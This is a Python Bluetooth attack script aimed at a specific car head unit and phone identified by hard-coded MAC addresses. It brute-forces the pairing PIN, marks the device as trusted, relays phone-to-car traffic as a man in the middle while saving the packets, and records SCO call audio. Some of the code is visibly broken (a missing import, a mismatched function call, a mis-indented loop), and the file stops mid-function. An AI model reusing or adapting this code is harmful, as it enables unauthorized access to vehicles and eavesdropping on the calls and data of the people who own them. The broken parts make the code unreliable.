import argparse
import logging
import subprocess
import sys
import os
import threading
import time
import bluetooth
import select
import signal
from datetime import datetime
import dbus
import dbus.mainloop.glib   
from gi.repository import GLib
import json
try:
    import scapy.all as scapy
    has_scapy = True
except ImportError:
    has_scapy = False
    print("[WARN] Scapy not installed. PCAP capture will be disabled.")
    print("[INFO] To enable PCAP capture, install scapy: pip install scapy")
import bluetooth  # PyBluez remains used for MitM
import select
import time
import subprocess
import logging
import sys
import os
import threading
import signal
import json
from datetime import datetime
import argparse
# D-Bus and GLib imports
import dbus
import dbus.service
import dbus.mainloop.glib
from gi.repository import GLib
import socket
from bluetooth import (
    BluetoothSocket, RFCOMM,
    advertise_service, SERIAL_PORT_CLASS,
    SERIAL_PORT_PROFILE
)

from threading import Thread
# Configure logging
logging.basicConfig(filename='bt_attack_suite.log',
                   level=logging.INFO,
                   format='%(asctime)s:%(levelname)s:%(name)s:%(message)s')
logger = logging.getLogger("bt_attack_suite")

# Add console logging
console = logging.StreamHandler()
console.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
console.setFormatter(formatter)
logger.addHandler(console)

# Target device information
car_mac = "00:0D:18:A1:60:58"
CAR_MAC = "00:0D:18:A1:60:58"
PHONE_MAC = "6C:55:63:33:4A:EB"
DEVICE_NAME = "CAR-KIT"
ADAPTER_NORMAL = "hci0"  # Adapter for connecting to real phone
ADAPTER_SPOOFED = "hci1"  # Adapter for spoofing and accepting car connections
CAR_CONNECT_ADAPTER = "hci1"  # Adapter that connects TO the real car
PHONE_WAIT_ADAPTER = "hci0"   # Adapter that waits for phone to connect
# Connection settings
DISCOVERY_TIMEOUT = 15  # Seconds to wait for service discovery
DISCOVERY_MAX_RETRIES = 3  # Number of retries for service discovery
CONNECTION_TIMEOUT = 10  # Seconds to wait for connection establishment
MAX_CONNECTION_RETRIES = 5  # Maximum number of connection retry attempts

# Service UUIDs (for MitM)
SPP_UUID = "00001101-0000-1000-8000-00805f9b34fb"  # Serial Port Profile
PBAP_UUID = "0000112f-0000-1000-8000-00805f9b34fb"  # Phone Book Access Profile
HFP_UUID = "0000111e-0000-1000-8000-00805f9b34fb"  # Hands-Free Profile
AVRCP_UUID = "0000110e-0000-1000-8000-00805f9b34fb"  # Audio/Video Remote Control Profile

# Global variables for MitM
running = True
all_threads = []
all_sockets = []

# Global PIN tracker for pairing brute force
current_pin = 0
pin_success = False
# Store successful PIN for later use
successful_pin = None

###########################################
# DBUS Agent Implementation for Pairing
###########################################
AGENT_PATH = "/com/bluetooth/agent"

class Agent(dbus.service.Object):
    """
    A BlueZ Agent that supplies a PIN code when requested.
    The PIN is derived from the global variable 'current_pin'.
    """
    def __init__(self, bus, path):
        dbus.service.Object.__init__(self, bus, path)
        self.bus = bus
        # Add a logger entry when agent is initialized
        logger.info(f"Agent initialized at {path}")

    @dbus.service.method("org.bluez.Agent1",
                         in_signature="o", out_signature="s")
    def RequestPinCode(self, device):
        global current_pin, successful_pin
        pin_candidate = f"{current_pin:04d}"
        logger.info(f"Agent: RequestPinCode for device {device} – providing PIN {pin_candidate}")
        successful_pin = pin_candidate  # Store PIN that's being tried
        return pin_candidate

    @dbus.service.method("org.bluez.Agent1",
                         in_signature="os", out_signature="")
    def DisplayPinCode(self, device, pincode):
        logger.info(f"Agent: DisplayPinCode for device {device} – PIN {pincode}")

    @dbus.service.method("org.bluez.Agent1",
                         in_signature="ou", out_signature="")
    def RequestConfirmation(self, device, passkey):
        global successful_pin
        logger.info(f"Agent: RequestConfirmation for {device}, passkey: {passkey}")
        logger.info("Automatically confirming passkey")
        successful_pin = str(passkey)  # Store the passkey that was accepted
        return
        
    @dbus.service.method("org.bluez.Agent1",
                         in_signature="o", out_signature="")
    def RequestAuthorization(self, device):
        logger.info(f"Agent: RequestAuthorization for device {device}")
        logger.info("Automatically authorizing device")
        return

    @dbus.service.method("org.bluez.Agent1",
                         in_signature="os", out_signature="")
    def AuthorizeService(self, device, uuid):
        logger.info(f"Agent: AuthorizeService for device {device} with service UUID {uuid}")
        return

    @dbus.service.method("org.bluez.Agent1",
                         in_signature="", out_signature="")
    def Cancel(self):
        logger.info("Agent: Cancel called")
        
    @dbus.service.method("org.bluez.Agent1",
                         in_signature="s", out_signature="")
    def Release(self, path):
        logger.info(f"Agent: Release called for {path}")


def register_agent():
    """
    Registers our agent with BlueZ so that it is used for pairing.
    Also starts a GLib MainLoop in a separate thread to process DBus requests.
    """
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()
    
    # Check first if agent already exists and remove it
    try:
        obj = bus.get_object("org.bluez", "/org/bluez")
        agent_manager = dbus.Interface(obj, "org.bluez.AgentManager1")
        # Try to unregister existing agent first
        try:
            agent_manager.UnregisterAgent(AGENT_PATH)
            logger.info("Unregistered existing agent")
        except dbus.DBusException:
            pass  # Agent wasn't registered, which is fine
    except Exception as e:
        logger.error(f"Error accessing BlueZ agent manager: {e}")
        
    # Create and register new agent
    agent = Agent(bus, AGENT_PATH)
    agent_manager = dbus.Interface(
        bus.get_object("org.bluez", "/org/bluez"),
        "org.bluez.AgentManager1"
    )
    
    # Register agent with capability "KeyboardDisplay"
    agent_manager.RegisterAgent(AGENT_PATH, "KeyboardDisplay")
    agent_manager.RequestDefaultAgent(AGENT_PATH)
    logger.info("Agent registered with BlueZ")

    # Run the GLib main loop in a separate thread
    mainloop = GLib.MainLoop()

    def run_glib_loop():
        try:
            logger.info("GLib MainLoop started")
            mainloop.run()
        except Exception as e:
            logger.error(f"GLib MainLoop error: {e}")
        finally:
            logger.info("GLib MainLoop terminated")

    thread = threading.Thread(target=run_glib_loop, daemon=True)
    thread.start()

    return agent, mainloop, bus

###########################################
# Helper functions for Device Discovery
###########################################
def get_device_path(target_mac, bus):
    """
    Iterates over BlueZ managed objects looking for a device with the given MAC address.
    Returns the DBus object path of the device if found, otherwise None.
    """
    manager = dbus.Interface(bus.get_object("org.bluez", "/"),
                             "org.freedesktop.DBus.ObjectManager")
    objects = manager.GetManagedObjects()
    for path, interfaces in objects.items():
        device = interfaces.get("org.bluez.Device1")
        if device is None:
            continue
        # BlueZ reports the MAC address in the "Address" property
        if device.get("Address") == target_mac:
            return path
    return None

def get_adapter_path(bus, adapter_name=None):
    """
    Returns the DBus path for the specified adapter or the first available one.
    """
    manager = dbus.Interface(bus.get_object("org.bluez", "/"),
                             "org.freedesktop.DBus.ObjectManager")
    objects = manager.GetManagedObjects()
    
    for path, interfaces in objects.items():
        adapter = interfaces.get("org.bluez.Adapter1")
        if adapter is None:
            continue
            
        if adapter_name is None or path.endswith(adapter_name):
            return path
    
    return None  # No adapter found

def reset_bluetooth_adapter(adapter_name=ADAPTER_NORMAL):
    """
    Reset the specified Bluetooth adapter
    """
    try:
        logger.info(f"Resetting Bluetooth adapter {adapter_name}...")
        subprocess.run(["sudo", "hciconfig", adapter_name, "down"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "hciconfig", adapter_name, "up"], check=True)
        time.sleep(2)
        logger.info(f"Bluetooth adapter {adapter_name} reset complete")
        return True
    except Exception as e:
        logger.error(f"Error resetting Bluetooth adapter {adapter_name}: {e}")
        return False

def reset_bluetooth_stack():
    """
    Complete reset of the Bluetooth stack to ensure a clean state
    """
    try:
        logger.info("Performing complete Bluetooth stack reset...")
        subprocess.run(["sudo", "systemctl", "stop", "bluetooth"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "hciconfig", ADAPTER_NORMAL, "down"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "hciconfig", ADAPTER_NORMAL, "up"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "systemctl", "start", "bluetooth"], check=True)
        time.sleep(3)  # Allow more time for services to initialize
        logger.info("Bluetooth stack reset completed")
        return True
    except Exception as e:
        logger.error(f"Error resetting Bluetooth stack: {e}")
        return False

def verify_device_properties(device_path, bus):
    """
    Verify that a discovered device has all the required properties and interfaces
    Returns True if the device is valid and ready for pairing
    """
    try:
        device_obj = bus.get_object("org.bluez", device_path)
        device_props = dbus.Interface(device_obj, "org.freedesktop.DBus.Properties")
        
        # Check for critical properties
        address = device_props.Get("org.bluez.Device1", "Address")
        
        # Name might not be available immediately
        try:
            name = device_props.Get("org.bluez.Device1", "Name")
            logger.info(f"Device verification: Address={address}, Name={name}")
        except:
            logger.info(f"Device verification: Address={address}, Name=Unknown")
        
        # Check if the device has the right interfaces
        introspect = dbus.Interface(device_obj, "org.freedesktop.DBus.Introspectable")
        xml = introspect.Introspect()
        has_device_interface = "org.bluez.Device1" in xml
        
        if has_device_interface:
            logger.info(f"Device at {device_path} verified - ready for pairing")
            return True
        else:
            logger.warning(f"Device at {device_path} missing Device1 interface")
            return False
            
    except Exception as e:
        logger.error(f"Error verifying device properties: {e}")
        return False

def save_successful_pin():
    """Save the successful PIN to a file for later use"""
    global successful_pin
    if successful_pin:
        try:
            with open("successful_pin.txt", "w") as f:
                f.write(successful_pin)
            logger.info(f"Saved successful PIN {successful_pin} to file")
        except Exception as e:
            logger.error(f"Error saving PIN to file: {e}")

def load_successful_pin():
    """Load a previously successful PIN from file"""
    try:
        if os.path.exists("successful_pin.txt"):
            with open("successful_pin.txt", "r") as f:
                pin = f.read().strip()
                logger.info(f"Loaded previously successful PIN: {pin}")
                return pin
        return None
    except Exception as e:
        logger.error(f"Error loading PIN from file: {e}")
        return None

def check_pairing_status(device_path, bus):
    """Check if a device is paired"""
    try:
        device_obj = bus.get_object("org.bluez", device_path)
        device_props = dbus.Interface(device_obj, "org.freedesktop.DBus.Properties")
        paired = device_props.Get("org.bluez.Device1", "Paired")
        return paired
    except Exception as e:
        logger.error(f"Error checking pairing status: {e}")
        return False

###########################################
# Improved PIN Cracker using DBus
###########################################
def pin_cracker_entry(start_pin=None, max_pin=10000):
    """
    Uses BlueZ D-Bus API to perform device discovery and pairing.
    Brute forces the PIN by iteratively trying 0000 to 9999.
    
    Args:
        start_pin: Optional starting PIN (int)
        max_pin: Maximum PIN to try (int)
    
    Returns:
        bool: True if successful, False otherwise
    """
    global current_pin, pin_success, successful_pin
    
    # Check for previously successful PIN
    saved_pin = load_successful_pin()
    if saved_pin:
        logger.info(f"Found previously successful PIN: {saved_pin}")
        successful_pin = saved_pin
        # Start with the saved PIN as the current PIN to try
        current_pin = int(saved_pin)
    else:
        current_pin = start_pin if start_pin is not None else 0
    
    # Start with a fresh Bluetooth stack
    reset_bluetooth_stack()
    
    # Set up the D-Bus connection and agent
    agent, mainloop, bus = register_agent()
    
    # Find the adapter path
    #adapter_path = get_adapter_path(bus, ADAPTER_NORMAL)
    adapter_path = "/org/bluez/hci0"
    if not adapter_path:
        logger.error(f"Adapter {ADAPTER_NORMAL} not found")
        return False
        
    logger.info(f"Using adapter at {adapter_path}")
    
    # Get the adapter interface
    try:
        adapter_obj = bus.get_object("org.bluez", adapter_path)
        adapter = dbus.Interface(adapter_obj, "org.bluez.Adapter1")
        adapter_props = dbus.Interface(adapter_obj, "org.freedesktop.DBus.Properties")
    except Exception as e:
        logger.error(f"Failed to get adapter interface: {e}")
        return False
        
    # Check if discovery is already active
    try:
        discovering = adapter_props.Get("org.bluez.Adapter1", "Discovering")
        if discovering:
            adapter.StopDiscovery()
            logger.info("Stopped existing discovery session")
    except Exception as e:
        logger.error(f"Error checking/stopping discovery: {e}")
    
    # Ensure adapter is powered on
    try:
        powered = adapter_props.Get("org.bluez.Adapter1", "Powered")
        if not powered:
            adapter_props.Set("org.bluez.Adapter1", "Powered", dbus.Boolean(True))
            logger.info("Powered on the Bluetooth adapter")
            time.sleep(1)  # Give it time to power up
    except Exception as e:
        logger.error(f"Failed to power on adapter: {e}")
    
    # Clear any existing pairing before attempting discovery
    try:
        existing_path = get_device_path(CAR_MAC, bus)
        if existing_path:
            logger.info(f"Found existing device at {existing_path}, removing it first")
            adapter.RemoveDevice(existing_path)
            time.sleep(2)  # Wait for removal
    except Exception as e:
        logger.info(f"No existing device to remove or error: {e}")
    
    # Start discovery
    try:
        adapter.StartDiscovery()
        logger.info("Started discovery for devices...")
    except dbus.DBusException as e:
        logger.error(f"Failed to start discovery: {e}")
        if "org.bluez.Error.AlreadyExists" in str(e):
            logger.info("Device is already paired — treating this as success")
            pin_success = True
            save_successful_pin()
            return True
        if "InProgress" in str(e):
            # Discovery already in progress, which is fine
            logger.info("Discovery was already in progress")
        else:
            # Try resetting the Bluetooth stack again
            reset_bluetooth_stack()
            try:
                # Get fresh adapter object
                adapter_obj = bus.get_object("org.bluez", adapter_path)
                adapter = dbus.Interface(adapter_obj, "org.bluez.Adapter1")
                adapter.StartDiscovery()
                logger.info("Started discovery after reset")
            except Exception as e2:
                logger.error(f"Failed to start discovery even after reset: {e2}")
                return False

    # Improved device discovery with longer wait times
    device_path = None
    wait_time = 2
    max_waits = 15  # about 30 seconds in total
    
    for attempt in range(max_waits):
        device_path = get_device_path(car_mac, bus)
    if device_path:
        print(f"[+] Found car at {device_path}")
        
        # Extract the correct adapter path from the device path
        adapter_path = device_path.rsplit('/', 1)[0]
        print(f"[*] Using adapter path from device: {adapter_path}")
        
        # Update the adapter object to use the correct path
        try:
            adapter_obj = bus.get_object("org.bluez", adapter_path)
            adapter = dbus.Interface(adapter_obj, "org.bluez.Adapter1")
            adapter_props = dbus.Interface(adapter_obj, "org.freedesktop.DBus.Properties")
        except Exception as e:
            print(f"[!] Error updating adapter: {e}")
                
        logger.info(f"Waiting for device discovery (attempt {attempt+1}/{max_waits})...")
        time.sleep(wait_time)
    
    # Verify final device path is valid
    if not device_path:
        logger.error("Target device not found after extended discovery!")
        adapter.StopDiscovery()
        return False
        
    logger.info(f"Successfully discovered target device at {device_path}")
    
    # Stop discovery before attempting pairing
    try:
        adapter.StopDiscovery()
        logger.info("Discovery stopped - preparing for pairing")
        time.sleep(1)  # Give it a moment after stopping discovery
    except Exception as e:
        logger.warning(f"Error stopping discovery: {e}")
    
    # Begin pairing attempts
    pin_success = False
    
    # Try to pair with a PIN code
    while current_pin < max_pin:
        reset_and_rediscover = False
        try:
            # Get fresh device object for each attempt
            device_obj = bus.get_object("org.bluez", device_path)
            device = dbus.Interface(device_obj, "org.bluez.Device1")
            
            # Format PIN with leading zeros
            pin_str = f"{current_pin:04d}"
            logger.info(f"Attempting to pair with PIN {pin_str}")
            
            # Create a separate thread to handle pairing to avoid blocking timeout
            pairing_successful = False
            pairing_error = None
            
            def pair_with_timeout():
                nonlocal pairing_successful, pairing_error
                try:
                    # This will trigger the agent's RequestPinCode method
                    device.Pair()
                    pairing_successful = True
                except Exception as e:
                    pairing_error = e
            
            # Start pairing in a separate thread
            pairing_thread = threading.Thread(target=pair_with_timeout)
            pairing_thread.daemon = True
            pairing_thread.start()
            connected_phone_mac = None
            # Wait for pairing to complete or timeout
            extended_timeout = 30  # seconds
            for i in range(extended_timeout):
                if not pairing_thread.is_alive():
                    break
                    
                # Check pairing status periodically
                if i % 3 == 0 and i > 0:
                    # Check if device is now paired
                    if check_pairing_status(device_path, bus):
                        logger.info(f"✓ Device shows as paired with PIN {pin_str}")
                        pin_success = True
                        successful_pin = pin_str
                        save_successful_pin()
                        
                        # Set device as trusted
                        try:
                            device_props = dbus.Interface(device_obj, "org.freedesktop.DBus.Properties")
                            device_props.Set("org.bluez.Device1", "Trusted", dbus.Boolean(True))
                            logger.info("Device set as trusted")
                        except Exception as e:
                            logger.warning(f"Could not set device as trusted: {e}")
                        
                        return True
                
                # Show activity every 5 seconds
                if i % 5 == 0 and i > 0:
                    logger.info(f"... Still waiting for pairing response (elapsed {i}s) ...")
                
                time.sleep(1)
            
            # After timeout, do a final check for pairing status
            if check_pairing_status(device_path, bus):
                logger.info(f"✓ Final check: Succe ssfully paired with PIN {pin_str}!")
                pin_success = True
                successful_pin = pin_str
                save_successful_pin()
                
                # Set device as trusted
                try:
                    device_props = dbus.Interface(device_obj, "org.freedesktop.DBus.Properties")
                    device_props.Set("org.bluez.Device1", "Trusted", dbus.Boolean(True))
                    logger.info("Device set as trusted")
                except Exception as e:
                    logger.warning(f"Could not set device as trusted: {e}")
                
                return True
            
            # Check if pairing was successful through the thread
            if pairing_successful:
                logger.info(f"✓ Successfully paired with PIN {pin_str}!")
                pin_success = True
                successful_pin = pin_str
                save_successful_pin()
                return True
            elif pairing_error:
                err_msg = str(pairing_error)
                
                if "org.bluez.Error.AuthenticationFailed" in err_msg:
                    logger.info(f"× Authentication failed with PIN {pin_str} - trying next PIN")
                elif "org.bluez.Error.AuthenticationCanceled" in err_msg:
                    logger.info(f"× Authentication canceled with PIN {pin_str} - trying next PIN") 
                elif "org.bluez.Error.AlreadyExists" in err_msg:
                    logger.info(f"Device is already paired — treating this as success")
                    pin_success = True
                    successful_pin = pin_str
                    save_successful_pin()
                    return True
                elif "org.bluez.Error.Failed" in err_msg:
                    logger.info(f"× General pairing failure with PIN {pin_str} - trying next PIN")
                elif "org.freedesktop.DBus.Error.NoReply" in err_msg:
                    # Don't immediately mark as failure - check pairing status
                    if check_pairing_status(device_path, bus):
                        logger.info(f"✓ No DBus reply but device is paired with PIN {pin_str}")
                        pin_success = True
                        successful_pin = pin_str
                        save_successful_pin()
                        return True
                    else:
                        logger.warning(f"× No reply during pairing with PIN {pin_str}")
                        time.sleep(2)
                        reset_and_rediscover = True
                elif "org.freedesktop.DBus.Error.UnknownObject" in err_msg:
                    logger.warning(f"× Device disappeared during pairing with PIN {pin_str}")
                    reset_and_rediscover = True
                else:
                    logger.error(f"× Unknown error with PIN {pin_str}: {err_msg}")
                    # Check pairing status even on unknown errors
                    if check_pairing_status(device_path, bus):
                        logger.info(f"✓ Despite error, device is paired with PIN {pin_str}")
                        pin_success = True
                        successful_pin = pin_str
                        save_successful_pin()
                        return True
                    reset_and_rediscover = True
            else:
                # Timeout with no explicit error - check pairing status
                if check_pairing_status(device_path, bus):
                    logger.info(f"✓ Timeout but device is paired with PIN {pin_str}")
                    pin_success = True
                    successful_pin = pin_str
                    save_successful_pin()
                    return True
                else:
                    logger.warning(f"× Timeout waiting for pairing response with PIN {pin_str}")
                    reset_and_rediscover = True
                    
            # Remove the device and do another discovery if needed
            if reset_and_rediscover:
                logger.info("Resetting and rediscovering...")
                try:
                    adapter.RemoveDevice(device_path)
                except Exception as e_rm:
                    pass  # Ignore removal errors
                
                # Reset Bluetooth stack every few attempts if needed
                if current_pin % 5 == 0:
                    reset_bluetooth_adapter()
                    
                    # Need to refresh our adapter object after reset
                    adapter_obj = bus.get_object("org.bluez", adapter_path)
                    adapter = dbus.Interface(adapter_obj, "org.bluez.Adapter1")
                
                # Start discovery again
                try:
                    adapter.StartDiscovery()
                    logger.info("Started discovery again...")
                except Exception as e_disc:
                    logger.warning(f"Error restarting discovery: {e_disc}")
                
                # Wait for device to be rediscovered
                found_device = False
                for _ in range(10):
                    time.sleep(2)
                    new_path = get_device_path(CAR_MAC, bus)
                    if new_path and verify_device_properties(new_path, bus):
                        device_path = new_path
                        found_device = True
                        logger.info(f"Rediscovered device at {device_path}")
                        break
                        
                if not found_device:
                    logger.error("Failed to rediscover device!")
                    return False
                    
                # Stop discovery before next pairing attempt
                try:
                    adapter.StopDiscovery()
                except Exception:
                    pass
            
            # Increment PIN for next try
            current_pin += 1
        except Exception as e:
            logger.error(f"Unexpected error in pairing attempt: {e}")
            current_pin += 1

    logger.error(f"Exhausted all PINs without success")
    return False

###########################################
# MitM (Man-in-the-Middle) functionality heremitm
###########################################

## FUNCTIONALITY FOR MITM 


def proxy_data(source_sock, dest_sock, direction, service_name):
    """Proxy data between two sockets with improved logging and error handling"""
    print(f"[INFO] Starting {direction} proxy for {service_name}...")
    if service_name == 'HFP':
        # Reduce buffer size for more immediate command processing
        buffer_size = 64  # Smaller buffer for faster command handling
        
        # Set shorter timeout
        source_sock.settimeout(0.05)  # More responsive for AT commands
    try:
        # Important: Set source socket to non-blocking with a short timeout
        source_sock.settimeout(0.1)
        
        # Make sure destination socket is not blocking
        dest_sock.settimeout(1.0)
        
        buffer_size = 1024  # Buffer size for data reads
        
        # Set up local variables to track connection status
        is_connected = True
        last_data_time = time.time()
        keepalive_interval = 5.0  # Send keepalive every 5 seconds if no data
        idle_timeout = 600.0  # Disconnect after 10 minutes of inactivity
        
        while running and is_connected:
            try:
                # Check if there's data to read without blocking
                if has_message_to_receive(source_sock, 0.1):
                    # Try to read data (will raise exception if closed)
                    data = source_sock.recv(buffer_size)
                    
                    # Empty data means connection closed
                    if not data:
                        print(f"[INFO] {direction} disconnected for {service_name} (connection closed)")
                        is_connected = False
                        break
                    
                    # Update last successful data time
                    last_data_time = time.time()
                    
                    # Log the data transfer
                    print(f"[DATA] {service_name} {direction}: {len(data)} bytes")
                    
                    # Print hexdump for debugging (only for small packets to avoid spam)
                    if len(data) <= 64:
                        print(hexdump(data))
                    
                    # Save captured data to file
                    save_captured_data(data, service_name, direction)
                    
                    # Special handling for HFP commands
                    if service_name == 'HFP' and direction == 'phone→car':
                        if handle_hfp_commands(data, dest_sock):
                            # Command was handled specially, no need to forward
                            continue
                    
                    # Forward the data
                    try:
                        # Important: Make sure we send ALL data
                        bytes_sent = 0
                        total_bytes = len(data)
                        
                        while bytes_sent < total_bytes:
                            sent = dest_sock.send(data[bytes_sent:])
                            if sent == 0:
                                # Connection broken
                                print(f"[ERROR] {direction} connection broken in {service_name}")
                                is_connected = False
                                break
                            bytes_sent += sent
                            
                        print(f"[INFO] {direction} forwarded {bytes_sent} bytes for {service_name}")
                    except Exception as e:
                        print(f"[ERROR] Failed to forward data for {service_name} {direction}: {e}")
                        is_connected = False
                        break
                
                # Check for idle timeout or add keepalives for some protocols
                current_time = time.time()
                time_since_last_data = current_time - last_data_time
                
                # For some services, send keepalives to prevent disconnection
                if service_name in ['HFP', 'HSP'] and time_since_last_data > keepalive_interval:
                    try:
                        # Send a minimal keep-alive packet if appropriate
                        if service_name == 'HFP' and direction == 'car→phone':
                            # Simple AT command to keep HFP alive
                            dest_sock.send(b'\r\n')
                            last_data_time = current_time
                            print(f"[INFO] Sent keepalive for {service_name} {direction}")
                    except Exception as e:
                        # Failed to send keepalive
                        print(f"[WARN] Failed to send keepalive for {service_name}: {e}")
                
                # Check for timeout
                if time_since_last_data > idle_timeout:
                    print(f"[INFO] {service_name} {direction} idle timeout - closing")
                    is_connected = False
                    break
                    
                # Short sleep to prevent CPU spinning
                time.sleep(0.01)
                    
            except socket.timeout:
                # Socket timeout is expected, just continue loop
                continue
            except bluetooth.btcommon.BluetoothError as e:
                if "Connection reset by peer" in str(e):
                    print(f"[INFO] {direction} connection reset in {service_name}")
                    is_connected = False
                    break
                elif "Resource temporarily unavailable" in str(e):
                    # Common error when socket is not ready - just retry
                    continue
                else:
                    print(f"[ERROR] Bluetooth error in {service_name} {direction}: {e}")
                    is_connected = False
                    break
            except Exception as e:
                print(f"[ERROR] Error in {service_name} {direction} proxy: {e}")
                is_connected = False
                break
                
    except Exception as e:
        print(f"[ERROR] Fatal error in {service_name} {direction} proxy: {e}")
    finally:
        print(f"[INFO] {direction} proxy for {service_name} terminated")
        # Don't close the sockets here - let the parent function handle cleanup

def has_message_to_receive(sock, timeout=0):
    """Check if there's data available to read from the socket without blocking"""
    try:
        ready_to_read, _, _ = select.select([sock], [], [], timeout)
        return len(ready_to_read) > 0
    except Exception as e:
        # For normal socket errors, just return False
        if "Bad file descriptor" in str(e) or "Socket operation on non-socket" in str(e):
            return False
        # Log other errors
        print(f"[WARN] Error in select: {e}")
        return False



def hexdump(data):
    """Create a hexdump of the data for better visibility"""
    result = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_values = ' '.join(f'{b:02x}' for b in chunk)
        ascii_values = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
        result.append(f"{i:04x}  {hex_values.ljust(48)}  |{ascii_values}|")
    return '\n'.join(result)



def save_captured_data(data, service_name, direction, session_dir_path): # Added session_dir_path
    try:
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S-%f")
        service_dir = os.path.join(session_dir_path, service_name) # Use the argument
        direction_dir = os.path.join(service_dir, direction)
        os.makedirs(direction_dir, exist_ok=True)
        
        filename_base = os.path.join(direction_dir, f"packet_{timestamp}")
        
        with open(f"{filename_base}.bin", "wb") as f:
            f.write(data)
        
        with open(f"{filename_base}.txt", "w") as f:
            # ... (rest of the function) ...
            f.write(hexdump(data))
            
        print(f"[*] Saved {direction} data to {filename_base}.bin") # Minor log improvement
        return True
    except Exception as e:
        print(f"[!] Error saving captured data: {e}")
        return False


# Add this function after the existing SCO-related functions like 'setup_sco_audio' and 'process_sco_audio'
# Around line ~335-340 in your code, after the proxy_data function
def intercept_sco_from_px5_headunit(car_mac="00:0D:18:A1:60:58", session_dir=None):
    """Specialized function to intercept SCO audio from PX5 Android headunit"""
    print(f"[INFO] Starting SCO audio interception from {car_mac}")
    
    if session_dir is None:
        # Use default session directory if none provided
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        session_dir = os.path.join("bt_captures", f"session_{timestamp}")
        os.makedirs(session_dir, exist_ok=True)
    
    # Create SCO audio directory
    audio_dir = os.path.join(session_dir, "SCO_Audio")
    os.makedirs(audio_dir, exist_ok=True)
    
    try:
        # Step 1: Check if an SCO connection already exists
        result = subprocess.run("sudo hcitool con", shell=True, capture_output=True, text=True)
        
        sco_handle = None
        for line in result.stdout.splitlines():
            if car_mac in line and "SCO" in line:
                # Extract the handle from the line
                match = re.search(r'Handle (\d+)', line)
                if match:
                    sco_handle = match.group(1)
                    print(f"[INFO] Found existing SCO connection with handle {sco_handle}")
                break
        
        # If no SCO connection exists, try to establish one
        if not sco_handle:
            print(f"[INFO] No existing SCO connection, attempting to establish one")
            
            # Request specific SCO parameters optimized for the PX5 CSR chip
            tx_bandwidth = 8000       # 8kHz sampling rate
            rx_bandwidth = 8000
            max_latency = 16          # Milliseconds (low latency for voice)
            voice_setting = 0x0060    # PCM input/output, 16-bit, CVSD
            retrans_effort = 0x02     # Retransmission effort (quality vs. power)
            packet_type = 0x0380      # EV3, EV4, EV5 packets (for eSCO)
            
            # Convert MAC address format for HCI command
            formatted_mac = car_mac.replace(':', ' ')
            
            # Use HCI command to establish SCO connection
            hci_cmd = f"sudo hcitool cmd 0x01 0x0028 {formatted_mac} {tx_bandwidth:04x} {rx_bandwidth:04x} {max_latency:04x} {voice_setting:04x} {retrans_effort:02x} {packet_type:04x}"
            
            print(f"[INFO] Executing: {hci_cmd}")
            subprocess.run(hci_cmd, shell=True, check=False)
            
            # Wait for the SCO connection to establish
            print(f"[INFO] Waiting for SCO connection to establish...")
            time.sleep(3)
            
            # Check again for the SCO connection
            result = subprocess.run("sudo hcitool con", shell=True, capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if car_mac in line and "SCO" in line:
                    match = re.search(r'Handle (\d+)', line)
                    if match:
                        sco_handle = match.group(1)
                        print(f"[INFO] Established SCO connection with handle {sco_handle}")
                    break
        
        if not sco_handle:
            print(f"[ERROR] Failed to establish SCO connection")
            return None
            
        # Step 2: Capture the SCO audio
        # Method 1: Try to open the SCO device directly
        sco_device = f"/dev/sco{sco_handle}" if os.path.exists(f"/dev/sco{sco_handle}") else f"/dev/bluetooth/sco/{sco_handle}"
        
        if os.path.exists(sco_device):
            print(f"[INFO] Using SCO device: {sco_device}")
            audio_file = os.path.join(audio_dir, f"sco_audio_{car_mac.replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.raw")
            
            try:
                # Open the SCO device file
                sco_fd = os.open(sco_device, os.O_RDWR | os.O_NONBLOCK)
                
                print(f"[INFO] Recording SCO audio to {audio_file}")
                with open(audio_file, "wb") as f:
                    # Record for up to 60 seconds or until interrupted
                    end_time = time.time() + 60
                    
                    while time.time() < end_time:
                        try:
                            # Check if there's data to read
                            r, _, _ = select.select([sco_fd], [], [], 0.1)
                            
                            if r:
                                # Read raw SCO audio data (typically 60 bytes per packet)
                                audio_data = os.read(sco_fd, 60)
                                if not audio_data:
                                    continue
                                
                                # Write to file
                                f.write(audio_data)
                                f.flush()
                                
                                print(f"[DATA] SCO audio: {len(audio_data)} bytes")
                        except KeyboardInterrupt:
                            print("[INFO] SCO recording interrupted")
                            break
                        except Exception as e:
                            if "Resource temporarily unavailable" in str(e):
                                # Non-blocking read with no data, just continue
                                time.sleep(0.01)
                                continue
                            else:
                                print(f"[ERROR] SCO read error: {e}")
                                break
                
                # Close the file descriptor
                os.close(sco_fd)
                print(f"[INFO] SCO audio recording completed: {audio_file}")
                return audio_file
                
            except Exception as e:
                print(f"[ERROR] Failed to open SCO device: {e}")
                # Fall back to Method 2
        
        # Method 2: Use HCI socket approach
        print(f"[INFO] Trying HCI socket approach for SCO audio")
        
        # Create an SCO socket
        sco_sock = bluetooth.BluetoothSocket(bluetooth.SCO)
        
        try:
            # Connect socket to the car's MAC address
            sco_sock.connect((car_mac, 0))  # SCO uses port 0
            
            # Set socket to non-blocking mode
            sco_sock.setblocking(False)
            
            # Record audio
            audio_file = os.path.join(audio_dir, f"sco_audio_{car_mac.replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.raw")
            
            print(f"[INFO] Recording SCO audio to {audio_file}")
            with open(audio_file, "wb") as f:
                # Record for up to 60 seconds or until interrupted
                end_time = time.time() + 60
                
                while time.time() < end_time:
                    try:
                        # Check if there's data to read
                        r, _, _ = select.select([sco_sock], [], [], 0.1)
                        
                        if r:
                            # Read SCO audio data
                            audio_data = sco_sock.recv(128)
                            if not audio_data:
                                continue
                            
                            # Write to file
                            f.write(audio_data)
                            f.flush()
                            
                            print(f"[DATA] SCO audio: {len(audio_data)} bytes")
                    except bluetooth.btcommon.BluetoothError as e:
                        if "Resource temporarily unavailable" in str(e):
